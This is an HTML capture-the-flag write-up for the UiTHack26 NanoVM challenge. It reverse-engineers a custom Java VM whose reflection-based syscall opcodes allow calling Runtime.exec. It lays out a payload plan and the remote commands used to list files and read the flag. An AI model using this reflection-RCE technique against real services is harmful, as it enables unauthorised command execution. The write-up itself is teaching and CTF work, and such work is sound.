@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UiTHack26 NanoVM Technical Writeup</title>
+    <style>
+:root {
+  color-scheme: dark;
+  --bg: #000000;
+  --bg-soft: #0a0a0a;
+  --panel: rgba(10, 10, 10, 0.86);
+  --panel-strong: rgba(17, 17, 17, 0.94);
+  --panel-soft: rgba(255, 255, 255, 0.03);
+  --text: #fafafa;
+  --muted: #a1a1aa;
+  --muted-strong: #d4d4d8;
+  --border: rgba(255, 255, 255, 0.1);
+  --border-strong: rgba(255, 255, 255, 0.16);
+  --accent: #ffffff;
+  --success: #7ee787;
+  --warning: #f5c451;
+  --danger: #ff7b72;
+  --shadow: 0 24px 80px rgba(0, 0, 0, 0.42);
+  --radius-xl: 28px;
+  --radius-lg: 20px;
+  --radius-md: 16px;
+  --radius-sm: 12px;
+  --content-width: 1100px;
+}
+
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+html {
+  scroll-behavior: smooth;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  color: var(--text);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height: 1.7;
+  background:
+    radial-gradient(circle at top, rgba(255, 255, 255, 0.12), transparent 0, transparent 18rem),
+    radial-gradient(circle at 20% 0%, rgba(255, 255, 255, 0.08), transparent 0, transparent 24rem),
+    linear-gradient(180deg, #060606 0%, #000000 34%, #050505 100%);
+}
+
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  background-image:
+    linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+  background-size: 64px 64px;
+  mask-image: linear-gradient(180deg, rgba(0, 0, 0, 0.55), transparent 92%);
+  opacity: 0.14;
+}
+
+main,
+.page,
+.wrap,
+.sheet {
+  width: min(var(--content-width), calc(100vw - 32px));
+  margin: 0 auto;
+}
+
+main,
+.page,
+.wrap {
+  padding-top: 32px;
+  padding-bottom: 64px;
+}
+
+.sheet {
+  padding: 28px;
+}
+
+.body {
+  padding: 28px;
+}
+
+header,
+section,
+.hero,
+.card,
+.sheet,
+.toc,
+.box,
+.callout,
+.note,
+.warn,
+.good,
+.diagram,
+.quote,
+.result {
+  position: relative;
+  background: linear-gradient(180deg, var(--panel-strong), var(--panel));
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+  backdrop-filter: blur(12px);
+}
+
+header,
+section,
+.hero,
+.toc,
+.box,
+.callout,
+.note,
+.warn,
+.good,
+.diagram,
+.quote,
+.result {
+  padding: 28px;
+  margin-bottom: 18px;
+}
+
+.card {
+  padding: 18px;
+}
+
+h1,
+h2,
+h3 {
+  margin: 0 0 14px;
+  color: var(--text);
+  line-height: 1.1;
+  letter-spacing: -0.03em;
+}
+
+h1 {
+  font-size: clamp(2.2rem, 6vw, 4.75rem);
+  font-weight: 700;
+}
+
+h2 {
+  font-size: clamp(1.35rem, 2.2vw, 1.95rem);
+  font-weight: 650;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+}
+
+h3 {
+  font-size: clamp(1.05rem, 1.4vw, 1.3rem);
+  font-weight: 600;
+  color: var(--muted-strong);
+}
+
+p,
+li,
+td,
+th,
+figcaption {
+  font-size: 1rem;
+  color: var(--muted-strong);
+}
+
+p,
+ul,
+ol,
+table,
+pre {
+  margin-top: 0;
+}
+
+ul,
+ol {
+  padding-left: 1.25rem;
+}
+
+li + li {
+  margin-top: 0.5rem;
+}
+
+a {
+  color: var(--text);
+  text-decoration-color: rgba(255, 255, 255, 0.35);
+  text-underline-offset: 0.18em;
+}
+
+a:hover {
+  text-decoration-color: rgba(255, 255, 255, 0.7);
+}
+
+strong {
+  color: var(--text);
+}
+
+code,
+.mono,
+.label,
+.pill,
+.meta,
+.flag {
+  font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, "Liberation Mono", monospace;
+}
+
+code,
+.mono,
+.label,
+.pill {
+  display: inline-block;
+  padding: 0.12rem 0.45rem;
+  border-radius: 999px;
+  background: rgba(255, 255, 255, 0.06);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  color: var(--text);
+  font-size: 0.92em;
+  word-break: break-word;
+}
+
+pre {
+  overflow-x: auto;
+  padding: 18px;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--border);
+  background: #050505;
+  color: #f4f4f5;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+}
+
+pre code {
+  display: inline;
+  padding: 0;
+  border: 0;
+  border-radius: 0;
+  background: transparent;
+}
+
+table {
+  display: block;
+  width: 100%;
+  overflow-x: auto;
+  border-collapse: collapse;
+  border-spacing: 0;
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+}
+
+thead,
+tbody,
+tr {
+  width: 100%;
+}
+
+th,
+td {
+  padding: 12px 14px;
+  text-align: left;
+  vertical-align: top;
+  border-bottom: 1px solid var(--border);
+  border-right: 1px solid var(--border);
+  background: rgba(255, 255, 255, 0.02);
+}
+
+th {
+  color: var(--text);
+  background: rgba(255, 255, 255, 0.05);
+  font-weight: 600;
+}
+
+tr:last-child td {
+  border-bottom: 0;
+}
+
+th:last-child,
+td:last-child {
+  border-right: 0;
+}
+
+.lead,
+.lede,
+.subtitle,
+.muted,
+.small,
+.mini,
+.footer {
+  color: var(--muted);
+}
+
+.meta {
+  display: inline-block;
+  padding: 0.4rem 0.8rem;
+  border-radius: 999px;
+  border: 1px solid var(--border);
+  background: rgba(255, 255, 255, 0.04);
+  font-size: 0.94rem;
+  color: var(--muted);
+}
+
+.grid,
+.cards,
+.two-col {
+  display: grid;
+  gap: 14px;
+}
+
+.grid,
+.cards {
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+}
+
+.two-col {
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+}
+
+.meta:has(> div) {
+  display: grid;
+  gap: 14px;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  padding: 0;
+  border: 0;
+  background: transparent;
+}
+
+.card,
+.meta > div {
+  background: linear-gradient(180deg, rgba(255, 255, 255, 0.045), rgba(255, 255, 255, 0.025));
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+}
+
+.meta > div {
+  padding: 16px;
+}
+
+.flag,
+.result {
+  display: inline-block;
+  padding: 0.85rem 1rem;
+  border-radius: var(--radius-sm);
+  border: 1px solid rgba(126, 231, 135, 0.32);
+  background: rgba(126, 231, 135, 0.08);
+  color: #d3f9d8;
+  font-size: 0.98rem;
+  word-break: break-word;
+}
+
+.note,
+.callout,
+.good,
+.success {
+  border-left: 3px solid var(--success);
+}
+
+.warn,
+.warning,
+.box.warn {
+  border-left: 3px solid var(--warning);
+}
+
+.quote,
+.diagram,
+.toc {
+  border-left: 3px solid rgba(255, 255, 255, 0.25);
+}
+
+.eyebrow,
+.diagram-title {
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.18em;
+  font-size: 0.78rem;
+  margin-bottom: 14px;
+}
+
+img,
+svg,
+video,
+canvas {
+  max-width: 100%;
+  height: auto;
+}
+
+@media (max-width: 900px) {
+  main,
+  .page,
+  .wrap {
+    width: min(var(--content-width), calc(100vw - 20px));
+    padding-top: 18px;
+    padding-bottom: 40px;
+  }
+
+  header,
+  section,
+  .hero,
+  .toc,
+  .box,
+  .callout,
+  .note,
+  .warn,
+  .good,
+  .diagram,
+  .quote,
+  .result {
+    padding: 20px;
+    border-radius: 18px;
+  }
+
+  .card,
+  .meta > div {
+    padding: 16px;
+  }
+
+  h1 {
+    letter-spacing: -0.04em;
+  }
+
+  .sheet,
+  .body {
+    padding: 20px;
+  }
+}
+
+@media (max-width: 640px) {
+  body {
+    line-height: 1.6;
+  }
+
+  main,
+  .page,
+  .wrap,
+  .sheet {
+    width: calc(100vw - 16px);
+  }
+
+  header,
+  section,
+  .hero,
+  .toc,
+  .box,
+  .callout,
+  .note,
+  .warn,
+  .good,
+  .diagram,
+  .quote,
+  .result {
+    padding: 16px;
+    margin-bottom: 14px;
+    border-radius: 16px;
+  }
+
+  .grid,
+  .cards,
+  .two-col,
+  .meta:has(> div) {
+    grid-template-columns: 1fr;
+  }
+
+  pre,
+  table {
+    font-size: 0.92rem;
+  }
+
+  .sheet,
+  .body {
+    padding: 16px;
+  }
+}
+  </style>
+
+</head>
+<body>
+  <main>
+    <header>
+      <h1>UiTHack26 NanoVM Technical Writeup</h1>
+      <p class="subtitle">A full reverse-engineering and exploitation writeup for the challenge &ldquo;Yo dawg, I heard you like VMs, so I put a VM in your VM!&rdquo;</p>
+      <div class="meta">Core issue: unrestricted reflection-based syscall registration inside a custom Java VM</div>
+    </header>
+
+    <section>
+      <h2>1. Challenge Overview</h2>
+      <p>The remote service listened on <code>uithack-2.td.org.uit.no:9020</code> and asked for a Base64-encoded <code>.bin</code> payload. Locally, the challenge files were minimal:</p>
+      <pre><code>NanoVM.class
+send_payload.py</code></pre>
+      <p>At first glance, the challenge theme suggests a &ldquo;VM inside a VM&rdquo; puzzle where the intended path might be a bytecode-level escape, an implementation bug in the interpreter, or a crafted nested program that breaks some sandboxing assumption.</p>
+      <p>After inspecting the provided files, it became clear that the challenge did not require exploiting low-level memory corruption in the VM. Instead, the VM already exposed a powerful and unsafe syscall layer built around Java reflection. That reflection layer was enough to achieve arbitrary code execution directly.</p>
+    </section>
+
+    <section>
+      <h2>2. Initial File Analysis</h2>
+      <h3>2.1 Python helper</h3>
+      <p><code>send_payload.py</code> was straightforward. It:</p>
+      <ul>
+        <li>reads a payload file as raw bytes</li>
+        <li>Base64-encodes the payload</li>
+        <li>connects to the remote service</li>
+        <li>sends the encoded blob followed by a newline</li>
+        <li>prints all output from the server</li>
+      </ul>
+      <p>That tells us the exploit format is simply a custom binary blob interpreted server-side.</p>
+
+      <h3>2.2 Java VM</h3>
+      <p><code>NanoVM.class</code> was supplied as compiled bytecode only, so the next step was to inspect it with <code>javap</code>. The decompilation immediately showed that the main interpreter method was a large <code>tableswitch</code> over byte opcodes ranging from <code>-2</code> up to <code>65</code>.</p>
+      <p>The key fields were:</p>
+      <table>
+        <tr>
+          <th>Field</th>
+          <th>Meaning</th>
+        </tr>
+        <tr>
+          <td><code>a</code></td>
+          <td>byte array containing the full VM program</td>
+        </tr>
+        <tr>
+          <td><code>F</code></td>
+          <td>instruction pointer</td>
+        </tr>
+        <tr>
+          <td><code>V</code></td>
+          <td>object stack</td>
+        </tr>
+        <tr>
+          <td><code>x</code></td>
+          <td>stack pointer</td>
+        </tr>
+        <tr>
+          <td><code>X</code></td>
+          <td>integer register file</td>
+        </tr>
+        <tr>
+          <td><code>D</code></td>
+          <td>hash map storing syscall IDs to Java <code>Method</code> objects</td>
+        </tr>
+        <tr>
+          <td><code>j</code> / <code>u</code></td>
+          <td>call stack and call stack pointer</td>
+        </tr>
+      </table>
+      <p>The VM also had a helper method that decodes strings from the program byte array:</p>
+      <pre><code>private java.lang.String F(int);
+
+// Reads:
+//   a[offset + 1 : offset + 5] as a 4-byte big-endian length
+//   a[offset + 5 : offset + 5 + len] as the string bytes</code></pre>
+      <p>This matters because it means the VM program can contain an inline string table, and opcodes can refer to strings by integer offsets.</p>
+    </section>
+
+    <section>
+      <h2>3. Reconstructing The Instruction Set</h2>
+      <p>Several opcodes were conventional VM operations: push immediate integer, arithmetic, bitwise logic, register load/store, direct memory read/write, conditional branches, call/return, and byte reads. Those are useful, but not actually the reason the challenge falls apart.</p>
+      <p>The critical opcodes were these:</p>
+      <table>
+        <tr>
+          <th>Opcode</th>
+          <th>Behavior</th>
+          <th>Impact</th>
+        </tr>
+        <tr>
+          <td><code>1</code></td>
+          <td>Push a 4-byte immediate integer onto the VM stack</td>
+          <td>Used to push string offsets and syscall IDs</td>
+        </tr>
+        <tr>
+          <td><code>10</code></td>
+          <td>Register a syscall by resolving a class name and method name via reflection</td>
+          <td>Main exploit primitive</td>
+        </tr>
+        <tr>
+          <td><code>-1</code></td>
+          <td>Invoke a previously registered syscall</td>
+          <td>Main exploit primitive</td>
+        </tr>
+        <tr>
+          <td><code>-2</code></td>
+          <td>Return / halt</td>
+          <td>Clean termination</td>
+        </tr>
+      </table>
+
+      <h3>3.1 Syscall registration</h3>
+      <p>The implementation behind opcode <code>10</code> did the following:</p>
+      <ol>
+        <li>Read three 4-byte integers from the bytecode stream</li>
+        <li>Treat the first integer as a pointer to a class name string</li>
+        <li>Treat the second integer as a pointer to a method name string</li>
+        <li>Treat the third integer as the expected parameter count</li>
+        <li>Load the class using <code>Class.forName(className)</code></li>
+        <li>Iterate through public methods returned by <code>getMethods()</code></li>
+        <li>Select the first method matching the target name and parameter count, excluding methods with array parameters</li>
+        <li>Store that <code>Method</code> object in a hashmap under an incrementing syscall ID</li>
+      </ol>
+      <p>This is already enough to see the problem. There is no allowlist, no package restriction, no security manager, and no check that the method is safe. Any public Java method with a supported signature can be registered.</p>
+
+      <h3>3.2 Syscall invocation</h3>
+      <p>Opcode <code>-1</code> then:</p>
+      <ol>
+        <li>Reads a 4-byte syscall ID</li>
+        <li>Looks up the corresponding <code>Method</code> object in the hashmap</li>
+        <li>Pops as many arguments from the VM stack as required by the method</li>
+        <li>For parameters of type <code>String</code>, if the VM argument is an <code>Integer</code>, it converts that integer into a string by treating it as an in-program string pointer</li>
+        <li>If the method is non-static, pops one extra stack value to use as the receiver object</li>
+        <li>Calls <code>Method.invoke(receiver, args)</code></li>
+        <li>If the return type is not <code>void</code>, pushes the return value back onto the VM stack</li>
+      </ol>
+      <p>That is an unrestricted reflective call gadget exposed intentionally as part of the VM design.</p>
+
+      <div class="callout">
+        <strong>Important observation:</strong> the automatic conversion from integer to <code>String</code> means the exploit does not need to construct Java strings dynamically. It only needs to place correctly formatted string blobs inside the payload and push their offsets.
+      </div>
+    </section>
+
+    <section>
+      <h2>4. Why This Is Enough For RCE</h2>
+      <p>With reflection available, the natural target is <code>java.lang.Runtime</code>.</p>
+      <p>The cleanest chain is:</p>
+      <ol>
+        <li>Register <code>Runtime.getRuntime()</code> as a syscall</li>
+        <li>Register <code>Runtime.exec(String)</code> as a syscall</li>
+        <li>Call <code>getRuntime()</code> to obtain a <code>Runtime</code> instance</li>
+        <li>Push a pointer to a command string</li>
+        <li>Call <code>exec(String)</code> using the returned <code>Runtime</code> object as the receiver</li>
+      </ol>
+      <p>The VM makes the final step even more convenient. After invoking a method, it checks whether the returned object is a <code>java.lang.Process</code>. If so, it automatically forwards the process stdout and stderr streams back to the current output stream. That means command output is exfiltrated automatically, without needing a second-stage read primitive.</p>
+      <p>In other words, once <code>Runtime.exec(String)</code> is reachable, the VM becomes a ready-made remote command runner.</p>
+    </section>
+
+    <section>
+      <h2>5. Building A Minimal Exploit Payload</h2>
+      <p>Rather than hand-assembling the payload bytes, I wrote a small helper script, <code>build_payload.py</code>. The payload format used by the exploit is:</p>
+      <pre><code>[code bytes][inline string blobs]</code></pre>
+      <p>Each string blob is encoded as:</p>
+      <pre><code>00 || 4-byte big-endian length || raw string bytes</code></pre>
+      <p>The leading zero is important because the VM string decoder reads the length from <code>offset + 1</code> and the bytes from <code>offset + 5</code>.</p>
+
+      <h3>5.1 Minimal bytecode plan</h3>
+      <pre><code>opcode 10 + ptr("java.lang.Runtime") + ptr("getRuntime") + 0
+opcode 10 + ptr("java.lang.Runtime") + ptr("exec") + 1
+opcode -1 + syscall_id_1
+opcode 1  + ptr(command)
+opcode -1 + syscall_id_2
+opcode -2</code></pre>
+
+      <h3>5.2 Why the stack order works</h3>
+      <p>When the VM invokes a non-static method, it pops arguments first and then pops one additional object as the receiver. For <code>Runtime.exec(String)</code>, the stack must therefore contain:</p>
+      <ol>
+        <li>receiver object lower on the stack</li>
+        <li>string argument on top of it</li>
+      </ol>
+      <p>The sequence above does exactly that:</p>
+      <ul>
+        <li><code>-1 syscall 1</code> pushes the <code>Runtime</code> instance</li>
+        <li><code>1 ptr(command)</code> pushes the string pointer on top</li>
+        <li><code>-1 syscall 2</code> pops the string argument first, converts it to a Java string, then pops the receiver object, and finally calls <code>exec</code></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>6. Local Verification</h2>
+      <p>Before touching the remote service, I validated the exploit locally against the supplied <code>NanoVM.class</code>.</p>
+      <pre><code>python3 build_payload.py 'id' payload.bin
+java NanoVM payload.bin</code></pre>
+      <p>This produced:</p>
+      <pre><code>uid=1000(userhonest) gid=1000(userhonest) groups=1000(userhonest),65534(nogroup)</code></pre>
+      <p>That confirmed all of the following:</p>
+      <ul>
+        <li>the opcode reconstruction was correct</li>
+        <li>the syscall registration logic worked as expected</li>
+        <li>the string pointer format was correct</li>
+        <li>the stack layout for invoking <code>Runtime.exec(String)</code> was correct</li>
+        <li>the VM really did pipe process output automatically</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>7. Remote Exploitation Step By Step</h2>
+
+      <h3>7.1 Connect to the service</h3>
+      <p>The challenge prompt looked like this:</p>
+      <pre><code>$ nc uithack-2.td.org.uit.no 9020
+Please send your .bin payload as a Base64 encoded string:</code></pre>
+      <p>Instead of pasting manually, the supplied helper script was used:</p>
+      <pre><code>python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+
+      <h3>7.2 First remote RCE test</h3>
+      <p>The first command attempted was <code>id</code>. That failed with an <code>IOException</code> indicating the program could not be found. The important lesson was that the remote environment did not resolve bare command names in the way expected by <code>Runtime.exec(String)</code>.</p>
+      <p>Using absolute paths fixed that immediately:</p>
+      <pre><code>python3 build_payload.py '/usr/bin/id' payload.bin
+python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+      <p>Remote output:</p>
+      <pre><code>uid=100(ctf) gid=101(ctf) groups=101(ctf)</code></pre>
+      <p>This established that code execution on the remote host was real and that the process ran as the <code>ctf</code> user.</p>
+
+      <h3>7.3 Initial guess for the flag path</h3>
+      <p>A common CTF convention is to place the flag at <code>/flag</code>, so the next attempt was:</p>
+      <pre><code>python3 build_payload.py '/bin/cat /flag' payload.bin
+python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+      <p>That returned:</p>
+      <pre><code>cat: /flag: No such file or directory</code></pre>
+      <p>So the flag path needed to be discovered.</p>
+
+      <h3>7.4 Enumerating the filesystem</h3>
+      <p>The next step was basic recon:</p>
+      <pre><code>python3 build_payload.py '/bin/ls /' payload.bin
+python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+      <p>This showed a normal container-style filesystem with an <code>/app</code> directory, which is a strong candidate in Dockerized challenge deployments.</p>
+
+      <p>The next command targeted that directory directly:</p>
+      <pre><code>python3 build_payload.py '/bin/ls -la /app' payload.bin
+python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+      <p>That produced the critical listing:</p>
+      <pre><code>total 36
+dr-xr-xr-x 1 root root  4096 Apr 11 10:12 .
+drwxr-xr-x 1 root root  4096 Apr 11 10:14 ..
+-r--r--r-- 1 root root 10711 Apr 11 10:10 NanoVM.class
+drwxr-xr-x 2 root root  4096 Apr 11 10:12 bin
+-r--r----- 1 root ctf     35 Apr 11 10:10 flag.txt
+-r--r--r-- 1 root root   713 Apr 11 10:10 server.py</code></pre>
+
+      <p>This immediately revealed three useful facts:</p>
+      <ul>
+        <li>the challenge files were mounted in <code>/app</code></li>
+        <li>the flag file was <code>/app/flag.txt</code></li>
+        <li>its permissions were <code>root:ctf</code> with mode <code>440</code>, and the process was running in group <code>ctf</code>, so it should be readable</li>
+      </ul>
+
+      <h3>7.5 Reading the flag</h3>
+      <pre><code>python3 build_payload.py '/bin/cat /app/flag.txt' payload.bin
+python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin</code></pre>
+      <p>Remote output:</p>
+      <pre><code>UiTHack26{35c4p3_7h3_n4n0vM_m4tr1x}</code></pre>
+    </section>
+
+    <section>
+      <h2>8. What Is Actually Happening Internally</h2>
+      <p>This challenge is a good example of why &ldquo;custom VM&rdquo; does not imply &ldquo;sandbox.&rdquo;</p>
+      <p>The NanoVM author implemented a syscall concept by storing reflective Java <code>Method</code> objects in a map and exposing a bytecode instruction to invoke them. From a design perspective, that makes the VM extremely flexible. From a security perspective, it completely defeats isolation.</p>
+      <p>The exploit did not need:</p>
+      <ul>
+        <li>a buffer overflow</li>
+        <li>an out-of-bounds read or write</li>
+        <li>type confusion</li>
+        <li>corruption of the VM register file</li>
+        <li>control-flow hijacking inside the Java runtime</li>
+      </ul>
+      <p>Instead, the intended interpreter functionality already allowed user-controlled code to:</p>
+      <ul>
+        <li>name an arbitrary class</li>
+        <li>resolve an arbitrary public method</li>
+        <li>supply controlled arguments</li>
+        <li>invoke the method</li>
+        <li>receive the result</li>
+      </ul>
+      <p>Once those conditions hold, methods such as <code>Runtime.exec</code>, <code>ProcessBuilder.start</code>, file-reading helpers, environment introspection, and many others are reachable. The VM effectively becomes a remote Java scripting interface.</p>
+    </section>
+
+    <section>
+      <h2>9. Why Absolute Paths Were Needed</h2>
+      <p>One subtle detail during exploitation was that <code>Runtime.exec(String)</code> with a single string argument does not behave like an interactive shell. It does not parse shell syntax, and command resolution can differ from what one expects when typing into a shell with a populated <code>PATH</code>.</p>
+      <p>That is why:</p>
+      <pre><code>id</code></pre>
+      <p>failed remotely, while:</p>
+      <pre><code>/usr/bin/id</code></pre>
+      <p>succeeded. The same principle was used for <code>/bin/ls</code> and <code>/bin/cat</code>.</p>
+      <p>If shell parsing had been needed, an alternative would have been to execute something like:</p>
+      <pre><code>/bin/sh -c '...'</code></pre>
+      <p>but this challenge did not require that because direct binary execution was sufficient.</p>
+    </section>
+
+    <section>
+      <h2>10. Final Flag</h2>
+      <p class="flag">UiTHack26{35c4p3_7h3_n4n0vM_m4tr1x}</p>
+    </section>
+
+    <section>
+      <h2>11. Final Summary</h2>
+      <p>The shortest accurate summary of the exploit is this: NanoVM exposed unrestricted Java reflection as a bytecode-level syscall mechanism, so the VM could directly register and invoke <code>Runtime.getRuntime()</code> and <code>Runtime.exec(String)</code>. That yielded remote command execution immediately. After confirming execution with <code>/usr/bin/id</code>, filesystem enumeration under <code>/app</code> revealed <code>/app/flag.txt</code>, which was readable by group <code>ctf</code>. Reading that file returned the flag.</p>
+      <p>This challenge is less about escaping a VM through a bug and more about recognizing that the VM was never actually a safe sandbox to begin with.</p>
+    </section>
+  </main>
+</body>
+</html>
